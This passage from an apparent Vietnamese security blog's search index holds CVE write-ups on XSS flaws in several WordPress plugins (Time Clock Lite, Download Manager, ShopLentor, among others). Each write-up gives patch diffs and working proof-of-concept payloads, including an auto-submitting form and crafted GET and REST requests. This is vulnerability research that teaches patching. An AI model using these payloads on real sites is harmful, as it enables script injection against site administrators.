","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-9816 trong plugin WP Statistics \u003c= 14.15.4 cho phép Stored XSS thông qua giá trị model lấy từ header User-Agent. Payload được lưu vào DB và hiển thị trong trang quản trị Device Models mà không escape đúng cách. Bản vá 14.15.5 đã thêm esc_html()/esc_attr() khi in ra HTML. Key takeaways: Stored XSS nguy hiểm hơn reflected vì tồn tại lâu dài trong DB. Dữ liệu đến từ HTTP headers cũng cần được coi như input không tin cậy. Luôn escape khi output thay vì chỉ sanitize khi input. Update plugin lên bản mới nhất để ngăn chặn khai thác. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet - PortSwigger WordPress WP Statistics \u003c= 14.15.4 - CVE-2025-9816 ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress All in One Time Clock Lite Plugin.","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng Reflected Cross-Site Scripting (XSS) trong plugin All in One Time Clock Lite cho WordPress. Lỗ hổng xuất phát từ tham số nonce ở các phiên bản đến và bao gồm 2.0, do xử lý đầu vào không đầy đủ và không escape đầu ra. Kẻ tấn công (kể cả không xác thực) có thể chèn các đoạn script tùy ý vào trang; những script này sẽ được thực thi khi nạn nhân thực hiện hành động bị thao túng (ví dụ: bấm vào một liên kết). CVE ID: CVE-2025-6832 Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 2.0 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress All in One Time Clock Lite Plugin ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - All in One Time Clock Lite: v2.0 (vulnerable) và v2.0.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:1:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rTrong phiên bản vulnerable, tham số nonce được lấy trực tiếp từ $_POST mà không qua bất kỳ sanitization nào: $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; Trong phiên bản patched, tham số nonce được xử lý bằng sanitize_text_field() trước khi sử dụng, ngăn chặn việc chèn mã độc: $nonce = (isset($_POST[\"nonce\"])) ? sanitize_text_field($_POST[\"nonce\"]) : null; 👉 Bản vá bổ sung lớp lọc đầu vào cho biến nonce, đảm bảo dữ liệu nhận từ request sẽ được loại bỏ ký tự nguy hiểm trước khi xử lý tiếp. So sánh thay đổi mã giữa bản vulnerable và bản vá ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable code\rLỗ hổng nằm trong hàm aio_time_clock_lite_js() thuộc class AIO_Time_Clock_Lite_Actions trong file aio-time-clock-lite-actions.php{: .filepath} public function aio_time_clock_lite_js() { // other logic $nonce = (isset($_POST[\"nonce\"])) ? $_POST[\"nonce\"] : null; if (wp_verify_nonce($nonce, 'time-clock-nonce')) { // other logic } else { echo json_encode( [ \"response\" =\u003e \"failed\", \"message\" =\u003e esc_attr_x(\"Not authorized to perform this action\", 'aio-time-clock-lite'), \"nonce\" =\u003e $nonce, \"clock_action\" =\u003e $clock_action, ] ); } wp_reset_postdata(); die(); } {: file=“aio-time-clock-lite-actions.php”} Hàm wp_verify_nonce() so sánh giá trị $nonce gửi từ client với giá trị hợp lệ mà server đã sinh ra trước đó bằng hàm wp_create_nonce(). \u003cinput type=\"hidden\" name=\"time-clock-nonce\" id=\"time-clock-nonce\" value=\"\u003c?php echo wp_create_nonce(\"time-clock-nonce\"); ?\u003e\"\u003e {: file=“aio-settings.php”} Nếu $nonce không hợp lệ =\u003e nhảy sang nhánh else trả về JSON báo lỗi chứa $nonce. Click 2 references ta thấy hàm public function aio_time_clock_lite_js() được gọi làm callback cho các action hook: Hàm aio_time_clock_lite_js() được gắn vào hai hook Ajax (authenticated \u0026 unauthenticated) wp_ajax_aio_time_clock_lite_js(authenticated). wp_ajax_nopriv_aio_time_clock_lite_js(unauthenticated). =\u003e Focus ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:2","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Sources \u0026 Sinks\rSource: Tham số nonce lấy trực tiếp từ $_POST (unauthenticated request). Sink: Giá trị nonce được phản chiếu lại trong echo json_encode(...). ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:3","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#sources--sinks"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rGửi POST request (unauthenticated) đến /wp-admin/admin-ajax.php với các params: action=aio_time_clock_lite_js\u0026nonce=nonce_value Callback aio_time_clock_lite_js() được gọi Kiểm tra giá trị nonce =\u003e invalid Phản chiếu giá trị nonce vào body bằng echo json_encode(...) ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:2:4","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:3:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo trang web chứa form submit: \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"post\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"aio_time_clock_lite_js\"\u003e \u003cinput type=\"hidden\" name=\"nonce\" value=\"\u003csvg onload=alert()\u003e\"\u003e \u003c/form\u003e \u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e Gửi link đến trang web chứa form cho người dùng cho dặc quyền. Quan sát việc thực hiện JavaScript được tiêm. Result — PoC execution screenshot ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:3:1","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-6832 trong plugin All in One Time Clock Lite \u003c= 2.0 cho phép unauthenticated attacker khai thác Reflected XSS thông qua tham số nonce. Bản vá 2.0.1 đã thêm sanitize_text_field() để lọc input, ngăn chặn mã độc được phản chiếu trong JSON response. Key takeaways: Luôn sanitize và escape dữ liệu trước khi trả về response. Endpoint mở cho nopriv (unauthenticated) cần được xem xét cẩn trọng. Reflected XSS thường xuất hiện khi giá trị input được phản chiếu trực tiếp trong output (JSON/HTML). Update plugin kịp thời là cách đơn giản nhất để giảm thiểu rủi ro. ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:4:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger WordPress All in One Time Clock Lite \u003c= 2.0 — CVE-2025-6832 ","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/:5:0","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Download Manager Plugin.","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng trong plugin Download Manager trước phiên bản 3.3.24. Dữ liệu được lấy từ GET request được in trực tiếp vào HTML attribute, reflected XSS xảy ra khi người dùng có đặc quyền truy cập vào đường dẫn do attack cung cấp. CVE ID: CVE-2025-10146 Product: WordPress Download Manager Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.3.23 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Download Manager: v3.3.23(vul) và v3.3.24(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file src/Admin/views/stats/history.php. Bản lỗi: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Lấy GET params và gán trực tiếp vào href của thẻ \u003ca\u003e mà không có cơ chế bảo vệ =\u003e nguy cơ reflected XSS. Bản vá: \u003c?php if (!empty($user_ids)): ?\u003e \u003cdiv class=\"clear-filter\"\u003e \u003c?php $get_params_xu = $get_params; unset($get_params_xu['user_ids']); $get_params_xu = \\WPDM\\__\\__::sanitize_array($get_params_xu, 'safetxt'); $reset_url = add_query_arg($get_params_xu, 'edit.php'); ?\u003e \u003ca href=\"\u003c?php echo esc_url($reset_url); ?\u003e\" class=\"clear-btn\" title=\"\u003c?php _e('Clear user filter', 'download-manager'); ?\u003e\"\u003e \u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e \u003c/a\u003e \u003c/div\u003e \u003c?php endif; ?\u003e Patch Diff: sanitized GET parameters and escaped URL Bản vá đã sanitize mảng GET params bằng sanitize_array và sử dụng esc_url để escape URL =\u003e an toàn hơn. ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How It Work?\rTa cần tìm URL thực sự để inject GET params chứa XSS payload. src/Admin/views/stats/history.php chứa các tag php, HTML và nằm trong views cho thấy file này được include ở nơi nào đó trong mã nguồn plugin. Ta tìm với từ khóa history.php trong thư mục plugin Search results for history.php 👉 Không có kết quả nào khớp. Khả năng cao nó được include động như này {$file_name}.php. Ta tìm với regex \\{.*\\}\\.php: Regex search for dynamic includes src/Admin/views/stats/history.php được include trong src/Admin/views/stats.php URL thực sự để truy cập được khai báo ở đầu file stats.php $base_page_uri = \"edit.php?post_type=wpdmpro\u0026page=wpdm-stats\"; Tương tự history.php, stats.php cũng được include ở đâu đó trong mã nguồn plugin. Nhưng không cần quan tâm vì ta đã tìm được URL thực sự. Để chắc chắn hơn, ta đặt breakpoint tại vị trí lỗ hổng trong file src/Admin/views/stats/history.php, sau đó bắt đầu debug và truy cập URL: edit.php?post_type=wpdmpro\u0026page=wpdm-stats Breakpoint debugging to observe GET params Trước tiên, plugin lấy toàn bộ GET parameters vào $get_params. Nếu $user_ids không rỗng, plugin sẽ tạo nút “Clear filter”. Để làm nút này hoạt động, cần một URL mà không còn user_ids nữa, nên plugin làm như sau: $get_params_xu = $get_params; // copy toàn bộ GET parameters unset($get_params_xu['user_ids']); // bỏ user_ids ra khỏi mảng $reset_url = add_query_arg($get_params_xu, 'edit.php'); // tạo URL mới unset($get_params_xu['user_ids']) =\u003e loại bỏ bộ lọc user_ids khỏi URL. add_query_arg($get_params_xu, 'edit.php') \u003e tạo URL mới với các tham số còn lại. Cuối cùng, URL này được gắn vào nút “Clear filter”: \u003ca href=\"\u003c?php echo $reset_url; ?\u003e\" class=\"clear-btn\"\u003e...\u003c/a\u003e Kết quả: Khi người dùng nhấn nút, trang sẽ load lại mà không còn bộ lọc user_ids, tức là “clear filter”. ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect XSS\rGửi GET request chứa XSS payload: GET /wp-admin/edit.php?post_type=wpdmpro\u0026page=wpdm-stats\u0026user_ids[0]=1\u0026payload=\"\u003e\u003c/a\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e HTTP/1.1 Ta thêm \"\u003e\u003c/a\u003e để đóng thẻ \u003ca\u003e sau đó thêm 1 script dể alert() Reflected XSS triggered via GET parameter 👉 XSS thành công, khi người dùng có đặc quyền truy cập vào URL do attacker cung cấp thì reflected XSS xảy ra =\u003e Xảy ra đúng kịch bản Unauthenticated ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#detect-xss"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-10146 trong plugin WordPress Download Manager \u003c= 3.3.23 là reflected XSS, xảy ra khi dữ liệu từ GET request được in trực tiếp vào HTML attribute mà không được sanitize hoặc escape. Người dùng có quyền truy cập vào đường dẫn này (admin/author) có thể bị tấn công nếu truy cập URL do attacker tạo. Bản vá 3.3.24 đã: Sanitize mảng GET parameters (sanitize_array) để loại bỏ ký tự nguy hiểm. Escape URL khi in ra HTML (esc_url) để ngăn XSS. Key takeaways: Luôn sanitize và escape dữ liệu từ người dùng trước khi render ra HTML. Kiểm tra quyền truy cập trước khi xử lý hoặc hiển thị dữ liệu nhạy cảm. Ngay cả các role thấp (contributor) vẫn có thể trở thành điểm tấn công nếu plugin không bảo vệ đúng cách. Cập nhật plugin thường xuyên là cách phòng thủ đơn giản nhưng hiệu quả nhất. ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress Download Manager Plugin \u003c= 3.3.24 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-06","objectID":"/vi/posts/2025-10-06-cve-2025-10146/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/vi/posts/2025-10-06-cve-2025-10146/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng trong plugin ShopLentor trước phiên bản 3.2.0 cho phép kẻ tấn công có quyền contributor chèn mã độc vào CSS của block. CSS này sau đó được nạp inline vào trang và có khả năng dẫn tới Stored XSS khi được preview hoặc hiển thị trong trình duyệt. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. ShopLentor: v3.2.0(vul) và v3.2.1(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Actived WooCommerce plugin: plugin bắt buộc actived trước khi cài ShopLentor Plugin ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch Diff\rDùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file woolentor-blocks/includes/classes/Manage_Styles.php. Bản lỗi: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Không kiểm tra quyền user // Không lọc nội dung CSS trước khi lưu update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } Bản vá: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Chỉ admin hoặc tác giả bài viết mới được phép $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // Lọc dữ liệu trước khi lưu $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } Bản vá dùng current_user_can(manage_options) để kiểm tra có phải admin không Nếu user là admin =\u003e vế đầu ! current_user_can('manage_options') = false =\u003e cả biểu thức \u0026\u0026 = false =\u003e qua được. Nếu user là author =\u003e vế sau get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e cả biểu thức \u0026\u0026 = false =\u003e qua được. Patch Diff ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"How It Work?\rpublic function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } Hàm save_block_css() thuộc class Manage_Styles có nhiệm vụ lưu hoặc xóa CSS tuỳ theo block. Ứng dụng sẽ lấy post_id và nội dung block_css từ request. Trường hợp đặc biệt: nếu post_id = woolentor-widget =\u003e lưu CSS vào wp_options Trường hợp bài viết thường: Nếu có block (has_block = true): Đánh dấu post đang active (_woolentor_active). Lưu CSS vào bảng wp_postmeta với meta_key là _woolentor_css. mysql\u003e select * from wp_postmeta where meta_key='_woolentor_css'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 27 | 69 | _woolentor_css | body:{} | | 687 | 1416 | _woolentor_css | body:{} | +---------+---------+----------------+------------+ Ghi CSS ra file trong thư mục upload (woolentor-css-{post_id}.css). Write CSS Nếu không có block (has_block = false): Xoá trạng thái active và CSS meta. Xoá file CSS nếu tồn tại. 👉 Khả năng xảy ra là combo Stored XSS phổ biến trong plugin WordPress: user role contributor (không có quyền publish) tạo post có CSS chứa payload XSS. Payload này được lưu trong database hoặc một file; Người dùng có đặc quyền cao hơn sẽ preview (xem trước) nội dung trước khi publish, payload sẽ được tải/hiển thị trong trình duyệt và thực thi, gây ra XSS. Để hiểu cách dữ liệu được hiển thị, ta tìm với từ khóa _woolentor_css trong thư mục plugin. Vì CSS được lưu trong wp_postmeta với meta_key = _woolentor_css, nên chắc chắn plugin sẽ truy vấn giá trị này và chèn trực tiếp vào HTML. Search Meta Key generate_inline_css() lấy block CSS từ wp_postmeta với meta_key = _woolentor_css và lấy từ file woolentor-css-{$post_id}.css, nếu file tồn tại thì get_contents và inline CSS cho post có $post_id được truyền vào, còn nếu file không tồn tại thì lấy từ wp_postmeta. Nội dung được đặt trong thẻ \u003cstyle type=\"text/css\"\u003e\u003c/style\u003e class Manage_Styles đăng ký REST API trong hàm register_routes public function register_routes( $namespace ){ register_rest_route( $namespace, 'save_css', [ [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'save_block_css' ], 'permission_callback' =\u003e [ $this, 'permission_check' ], 'args' =\u003e [] ] ] ); // other route } Hàm register_rest_route() tạo một REST API endpoint tại đường dẫn: /wp-json/{namespace}/save_css Khi có request POST tới endpoint này: WordPress sẽ gọi hàm save_block_css() để xử lý dữ liệu. Trước đó, permission_cal","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#how-it-work"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Detect XSS\rSử dụng user có role contributor tạo 1 post bất kì, ghi nhớ id của post đó. Gửi POST request đến endpoint http://localhost/wp-json/woolentor/v1/save_css với XSS payload POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Response 👉 Thiếu header X-WP-Nonce để phân quyền người dùng. Ta mở source HTML (Ctrl+U) trang chỉnh sửa bài viết: view-source:http://localhost/wp-admin/post.php?post=\u003cpost_id\u003e\u0026action=edit Tìm wpApiSettings trong source và lấy giá trị nonce wpApiSettings Gửi request với X-WP-Nonce có giá trị vừa lấy được POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost X-WP-Nonce: f79ec79e4b Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Preview post Preview 👉 XSS thành công, inspect để xem code được thay đổi như nào View source code Code ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#detect-xss"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-58990 trong plugin ShopLentor \u003c= 3.2.0 cho phép contributor chèn CSS độc hại dẫn đến Stored XSS khi admin/author preview hoặc xem post. Bản vá 3.2.1 bổ sung kiểm tra quyền và sanitize CSS, ngăn chặn khai thác. Key takeaways: Luôn kết hợp kiểm tra quyền và sanitize dữ liệu khi xử lý input từ người dùng. Các role thấp (như contributor) vẫn có thể trở thành điểm tấn công nếu API không bảo vệ đúng cách. Stored XSS trong WordPress thường xuất hiện khi dữ liệu được lưu DB/file =\u003e render inline mà không lọc. Việc cập nhật plugin kịp thời là biện pháp phòng thủ đơn giản nhưng hiệu quả nhất. ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress ShopLentor Plugin \u003c= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-05","objectID":"/vi/posts/2025-10-05-cve-2025-58990/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/vi/posts/2025-10-05-cve-2025-58990/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/vi/posts/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/vi/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analyst"],"collections":null,"content":"Lỗ hổng xảy ra trên plugin Authorsy của WordPress trước phiên bản 1.0.6. Điều này có thể cho phép kẻ tấn công chèn mã độc (ví dụ: script chuyển hướng, quảng cáo, hoặc các payload HTML khác) vào website, và những mã đó sẽ được thực thi khi khách truy cập mở trang. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting 